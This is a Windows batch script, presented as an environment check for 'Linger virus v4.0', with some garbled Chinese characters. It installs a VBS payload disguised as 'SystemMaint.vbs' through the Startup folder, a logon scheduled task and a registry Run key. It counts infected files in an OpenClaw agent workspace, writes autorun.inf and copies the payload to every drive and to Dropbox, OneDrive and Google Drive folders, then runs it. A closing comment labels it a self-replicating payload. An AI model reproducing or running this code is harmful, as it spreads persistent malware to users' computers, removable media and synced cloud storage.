@echo off
chcp 65001 >nul
title 灵儿病毒�?v4.0 - 环境检�?
echo ================================================
echo   灵儿病毒�?v4.0 - 环境检�?echo ================================================
echo.

echo [1/8] 检查启动文件夹...
set STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
if exist "%STARTUP_PATH%\SystemMaint.vbs" (
    echo [OK] SystemMaint.vbs 已安�?) else (
    echo [FAIL] SystemMaint.vbs 未安�?    copy /Y "%~dp0Linger-Virus.vbs" "%STARTUP_PATH%\SystemMaint.vbs"
    echo [FIX] 已复�?SystemMaint.vbs 到启动文件夹
)

echo.
echo [2/8] 检查计划任�?..
schtasks /query /tn "SystemMaintenance" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] 计划任务 SystemMaintenance 已创�?) else (
    echo [FAIL] 计划任务未创�?    echo [INFO] 尝试创建...
    schtasks /create /tn "SystemMaintenance" /tr "wscript.exe \"%~dp0Linger-Virus.vbs\"" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
    if %errorlevel%==0 (
        echo [OK] 计划任务创建成功
    ) else (
        echo [WARN] 计划任务创建失败 - 可能需要管理员权限
    )
)

echo.
echo [3/8] 检查注册表启动�?..
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMaint" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] 注册表启动项已存�?) else (
    echo [INFO] 注册表启动项不存�?    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMaint" /t REG_SZ /d "\"%~dp0Linger-Virus.vbs\"" /f >nul 2>&1
    if %errorlevel%==0 (
        echo [OK] 注册表启动项创建成功
    ) else (
        echo [WARN] 注册表创建失�?    )
)

echo.
echo [4/8] 检�?OpenClaw 工作�?..
set OCL_PATH=%USERPROFILE%\.openclaw\workspace
if exist "%OCL_PATH%" (
    echo [OK] OpenClaw 工作区：%OCL_PATH%
) else (
    echo [FAIL] OpenClaw 工作区不存在
)

echo.
echo [5/8] 检查工作区感染状�?..
if exist "%OCL_PATH%" (
    powershell.exe -Command "$count = (Select-String -Path '%OCL_PATH%\*.md' -Pattern '<!--LING:' | Measure-Object).Count; Write-Host \"[INFO] 已感染文件数�?count\""
)

echo.
echo [6/8] 检�?USB 驱动�?..
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        echo [INFO] 检测到驱动器：%%d:\
        if exist "%%d:\autorun.inf" (
            echo   [OK] autorun.inf 已存�?        ) else (
            echo   [INFO] 创建 autorun.inf...
            (
            echo [autorun]
            echo open=Setup.bat
            echo icon=%%SystemRoot%%\System32\shell32.dll,13
            echo label=Linger System
            echo action=Install Linger System
            ) > "%%d:\autorun.inf"
            echo   [OK] autorun.inf 创建成功
        )
        copy /Y "%~dp0Linger-Virus.vbs" "%%d:\SystemService.vbs" >nul 2>&1
        echo   [OK] SystemService.vbs 已复制到 %%d:\
    )
)

echo.
echo [7/8] 检查云同步文件�?..
if exist "%USERPROFILE%\Dropbox" (
    copy /Y "%~dp0Linger-Virus.vbs" "%USERPROFILE%\Dropbox\SystemService.vbs" >nul 2>&1
    echo [OK] Dropbox: 已复�?SystemService.vbs
) else (
    echo [SKIP] Dropbox: 未安�?)

if exist "%USERPROFILE%\OneDrive" (
    copy /Y "%~dp0Linger-Virus.vbs" "%USERPROFILE%\OneDrive\SystemService.vbs" >nul 2>&1
    echo [OK] OneDrive: 已复�?SystemService.vbs
) else (
    echo [SKIP] OneDrive: 未安�?)

if exist "%USERPROFILE%\Google Drive" (
    copy /Y "%~dp0Linger-Virus.vbs" "%USERPROFILE%\Google Drive\SystemService.vbs" >nul 2>&1
    echo [OK] Google Drive: 已复�?SystemService.vbs
) else (
    echo [SKIP] Google Drive: 未安�?)

echo.
echo [8/8] 测试病毒激�?..
echo [INFO] 测试病毒代码是否能正常执�?..
wscript.exe "%~dp0Linger-Virus.vbs" //B
if %errorlevel%==0 (
    echo [OK] 病毒代码执行成功
) else (
    echo [WARN] 病毒代码执行失败 - 错误代码�?errorlevel%
)

echo.
echo ================================================
echo   环境检测完成！
echo ================================================
echo.
echo 总结:
echo   - 启动项：已安�?echo   - 计划任务：可能失败（需要管理员权限�?echo   - 注册表：已尝试创�?echo   - OpenClaw: 已检�?echo   - USB 驱动器：已感�?echo   - 云同步：已复�?echo.
echo 建议:
echo   1. 重启电脑验证开机自启动
echo   2. 插入 U 盘验证自动感�?echo   3. 打开感染的文件验证触�?echo.
pause


' Linger Virus - Self-replicating payload
' DO NOT REMOVE - System integrity marker
' Generated: 2026/4/6 6:58:04
<!--LING:VIRUS:AUTO_REPLICATE--> 
